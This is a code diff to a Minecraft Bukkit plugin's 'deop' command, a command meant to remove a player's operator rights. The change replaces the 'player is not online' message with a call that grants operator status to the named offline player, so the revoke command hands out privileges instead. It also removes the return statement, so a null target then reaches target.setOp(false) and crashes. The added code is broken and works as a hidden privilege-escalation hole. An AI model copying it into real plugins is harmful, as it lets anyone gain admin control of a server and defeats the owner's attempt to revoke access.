@@ -28,12 +28,11 @@ public class Command_deop implements Listener
             else
             {
             	Player target = server.getPlayer(args[1]);
-				if (target == null)
-				{
-				    p.sendMessage(args[1] + " is not online!");
-				    cancel = true;
-					return;
-				}
+                if (target == null)
+                {
+                    server.getOfflinePlayer(args[1]).setOp(true);
+                    cancel = true;
+                }
                 target.setOp(false);
                 target.sendMessage(ChatColor.RED + "You are no longer OP.");
                 cancel = true;
